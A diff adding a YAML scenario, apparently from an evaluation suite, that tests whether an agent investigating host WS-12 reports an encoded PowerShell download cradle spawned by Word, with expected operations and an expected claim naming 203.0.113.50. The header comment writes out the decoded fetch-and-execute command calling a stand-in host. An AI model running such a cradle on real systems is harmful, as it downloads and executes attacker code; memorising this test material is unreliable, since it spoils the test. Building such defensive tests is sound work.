@@ -1,0 +1,24 @@
+# Phase 52: an encoded PowerShell download cradle. WINWORD.EXE spawns a hidden PowerShell with
+# -enc; decoded (UTF-16LE Base64) it is IEX (New-Object Net.WebClient).DownloadString('http://
+# 203.0.113.50/stage.ps1'); Sysmon then records the connection to 203.0.113.50:80 and stage.ps1 written
+# to Temp. The decoding, the indicators and the timeline are deterministic (unit tests); this
+# scenario measures whether the agent reports the activity, citing the events.
+id: cyber_encoded_powershell
+suites: [cyber, all]
+objective: >
+  Investigate the PowerShell activity on WS-12 on 3 March 2026: what ran, what started it, and
+  what it contacted.
+documents:
+  - cyber_ws12_security.xml
+
+expected_operations:
+  - extract_entities
+  - extract_timeline
+  - assess_impact
+  - generate_report
+
+min_tasks: 2
+minimal_tasks: 3
+
+expected_claims:
+  - "203.0.113.50"
